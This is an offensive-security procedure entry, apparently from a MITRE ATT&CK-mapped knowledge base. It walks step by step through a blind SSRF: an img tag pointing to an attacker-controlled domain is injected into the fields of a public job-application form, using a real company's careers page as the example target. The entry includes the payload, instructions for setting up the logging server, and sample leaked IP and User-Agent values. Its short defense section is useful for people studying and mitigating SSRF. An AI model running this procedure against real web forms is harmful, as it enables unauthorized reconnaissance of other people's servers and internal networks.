---
id: proc-uuid-123
tags:
  - ssrf
  - blind-ssrf
  - html-injection
  - web-form
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Reconnaissance]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T04:39:09.987Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Reconnaissance]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Inject-Img-Tag-for-Blind-SSRF-in-Web-Form

## Summary

This procedure exploits insufficient input sanitization in web application forms by injecting HTML `<img>` tags, triggering blind Server-Side Request Forgery (SSRF). It causes the server to fetch external resources during form processing, enabling reconnaissance of internal network details without direct feedback to the attacker.

## Description

In scenarios like job application forms, user inputs are often processed server-side, including rendering or parsing HTML. By injecting `<img src="https://attacker-controlled.com">` into multiple fields, the server attempts to load the image when handling the submission, resulting in an outbound request to the attacker's server. This blind SSRF can leak the server's internal IP, User-Agent, and potentially allow further attacks like port scanning if the server lacks proper network controls. The procedure targets public-facing web forms and requires no authentication.

## Requirements

1. Access to a web browser for form interaction
2. Control over an external HTTP server to log incoming requests (e.g., using ngrok or a VPS with access logging enabled)
3. Knowledge of the target form's URL and structure
4. Basic understanding of HTML injection techniques

## Defense

Defensive measures and detection strategies:

- Implement strict input sanitization and validation to strip or escape HTML tags in form fields
- Use allowlists for outbound network requests to block connections to untrusted domains
- Monitor server logs for anomalous outbound HTTP requests from application processes
- Deploy Web Application Firewalls (WAF) to detect and block HTML injection patterns

## Objectives

1. Trigger unauthorized server requests to attacker-controlled endpoints
2. Leak internal server metadata such as IP address and User-Agent
3. Enable potential follow-on reconnaissance or exploitation of internal services

## Instructions

### Step 1: Prepare Attacker-Controlled Endpoint

**Context**: Set up a server to receive and log SSRF requests for verification.

Start a simple HTTP server on a domain you control, configured to log all incoming requests including source IP and headers.

**Expected Output**: Server listening on port 80, ready to capture requests.

### Step 2: Access Target Form

**Context**: Navigate to the vulnerable web form to identify input fields.

Visit the target URL (e.g., https://mixmax.com/careers) and open an application form by clicking "Apply now".

**Expected Output**: Form with multiple text input fields loaded.

### Step 3: Inject Payload

**Context**: Insert the img tag into all form fields to maximize the chance of server-side execution.

In each input field (name, email, message, etc.), enter: `<img src="https://your-controlled-domain.com">`. Replace `your-controlled-domain.com` with your endpoint.

**Expected Output**: Payload visible in form fields; no client-side blocking.

### Step 4: Submit and Trigger SSRF

**Context**: Submit the form to initiate server-side processing and resource fetching.

Click the submit button (e.g., "Send Application").

**Expected Output**: Form submits successfully; blind nature means no immediate response.

### Step 5: Verify Exploitation

**Context**: Check logs to confirm the SSRF occurred.

Review access logs on your controlled server for requests from the target's IP (e.g., 66.249.84.213) and User-Agent (e.g., Mozilla/5.0 via GoogleImageProxy).

**Expected Output**: Log entry showing the SSRF request with leaked details.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]
- [[Reconnaissance]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[ssrf]]
- [[blind-ssrf]]
- [[html-injection]]
- [[web-vulnerability]]
